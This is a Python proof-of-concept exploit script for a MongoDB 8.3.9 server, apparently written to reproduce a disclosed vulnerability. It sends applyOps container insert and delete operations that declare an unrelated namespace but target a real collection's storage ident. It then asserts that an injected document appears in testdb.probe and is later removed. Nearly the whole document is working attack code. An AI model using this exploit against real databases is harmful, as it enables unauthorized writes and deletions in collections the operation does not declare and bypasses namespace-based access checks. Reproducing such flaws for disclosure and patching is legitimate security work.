#!/usr/bin/env python3
"""
PoC: applyOps container op (ci/cd) ns/container namespace mismatch.

Reproduced live against the official mongodb-linux-x86_64-ubuntu2204-8.3.9
binary, started with --setParameter featureFlagPrimaryDrivenIndexBuilds=true
to get past the (already correctly fixed) CVE-2026-82062 gate for
reproduction purposes only -- everything downstream of that gate is
unmodified 8.3.9 code.

    ./mongod --dbpath ./data2 --port 27018 \
        --setParameter featureFlagPrimaryDrivenIndexBuilds=true
"""
import pymongo
import bson
from bson.int64 import Int64

HOST, PORT = "127.0.0.1", 27018

c = pymongo.MongoClient(HOST, PORT, serverSelectionTimeoutMS=8000)
print("[*] target:", c.admin.command("buildInfo")["version"])

db = c.testdb
db.probe.drop()
db.probe.insert_one({"_id": 1, "x": "hello"})

ident = next(
    e["ident"] for e in c.admin.aggregate([{"$listCatalog": {}}])
    if e.get("ns") == "testdb.probe"
)
print(f"[*] real storage ident for testdb.probe: {ident}")

print("\n=== container INSERT, declaring an unrelated ns ===")
op_insert = {
    "op": "ci",
    "ns": "otherdb.unrelated_namespace_i_declare",
    "container": ident,
    "o": {"k": Int64(50), "v": bson.Binary(bson.encode({"_id": 999, "injected": "via-container-op"}))},
}
print("[*] applyOps result:", c.admin.command("applyOps", [op_insert]))
print("[*] testdb.probe contents:", list(db.probe.find()))
assert any(d.get("_id") == 999 for d in db.probe.find()), "expected injected doc in testdb.probe"
print("[+] confirmed: write landed in testdb.probe despite declaring an unrelated ns")

print("\n=== container DELETE, declaring a different unrelated ns ===")
op_delete = {
    "op": "cd",
    "ns": "yet_another_unrelated_db.somecoll",
    "container": ident,
    "o": {"k": Int64(50)},
}
print("[*] applyOps result:", c.admin.command("applyOps", [op_delete]))
print("[*] testdb.probe contents:", list(db.probe.find()))
assert not any(d.get("_id") == 999 for d in db.probe.find()), "expected injected doc removed"
print("[+] confirmed: delete removed the record from testdb.probe despite declaring an unrelated ns")
